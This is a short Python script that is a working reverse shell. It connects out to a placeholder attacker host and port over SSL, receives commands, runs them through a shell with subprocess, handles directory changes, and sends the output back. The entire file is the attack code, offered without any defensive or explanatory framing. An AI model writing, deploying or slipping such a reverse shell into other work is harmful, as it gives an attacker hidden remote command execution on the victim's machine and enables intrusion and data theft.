import socket as s
import subprocess as r
import ssl
import os

so=s.socket(s.AF_INET,s.SOCK_STREAM)
so.connect(('{IP}',{PORT}))
so=ssl.wrap_socket(so)
while True:
	d=so.recv(1024)
	if len(d)==0:
		break
	if d.strip().split(" ")[0]=="cd":
		path=os.path.abspath(d.strip().split(" ")[1])
		if os.path.exists(path) and os.path.isdir(path):
			os.chdir(path)
			o = "[+] Changed dir...\n"
		else:
			o = "[!] dir doesn't exist!\n"
	else:
		p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
		o=p.stdout.read()+p.stderr.read()
	so.sendall(o)
